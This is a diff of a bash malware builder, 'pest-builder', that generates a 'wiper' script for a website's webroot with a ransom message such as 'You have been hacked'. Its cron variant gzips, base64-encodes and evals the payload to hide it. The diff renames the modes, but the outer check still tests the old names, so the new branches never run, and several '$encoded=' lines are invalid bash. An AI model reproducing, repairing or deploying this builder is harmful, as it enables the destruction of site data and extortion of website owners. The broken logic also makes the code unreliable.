@@ -60,9 +60,9 @@ done
 '
 
 
-usage_text="Usage:\n\tbash pest-builder wiper|cronwiper path/to/webroot \"Ransom message\" sleepseconds\n\n";
-usage_text+="Example:\n\tbash pest-builder wiper /home/user/public_html \"You have been hacked\" 300\n\n";
-usage_text+="\tbash pest-builder cronwiper /home/user/public_html \"You have been hacked\" 300\n\n";
+usage_text="Usage:\n\tbash pest-builder loop|cron path/to/webroot \"Ransom message\" sleepseconds\n\n";
+usage_text+="Example:\n\tbash pest-builder loop /home/user/public_html \"You have been hacked\" 300\n\n";
+usage_text+="\tbash pest-builder cron /home/user/public_html \"You have been hacked\" 300\n\n";
 
 if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
 
@@ -82,15 +82,15 @@ if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
     content=${content//-r RANSOM_MESSAGE=/-r RANSOM_MESSAGE=\"$3\"}
     content=${content//-r SLEEP_TIME=/-r SLEEP_TIME=$4}
 
-    if [[ "$1" = "wiper" ]]; then
+    if [[ "$1" = "loop" ]]; then
 
-        echo -e "$content\n\n$loop_template" > ".wiper"
+        echo -e "$content\n\n$loop_template" > ".loop_wiper"
         #echo -e "\n\n$loop_template" >> ".wiper"
 
         echo -e "\n\nWiper created successfully."
         exit
 
-    elif [[ "$1" = "cronwiper" ]]; then
+    elif [[ "$1" = "cron" ]]; then
         $encoded=$(printf "%s" "$content\n\nact" | gzip -c | base64)
         $encoded="printf "%s" "$encoded" | base64 -d | gunzip -c | eval;"
         $encoded > ".cron_wiper"        
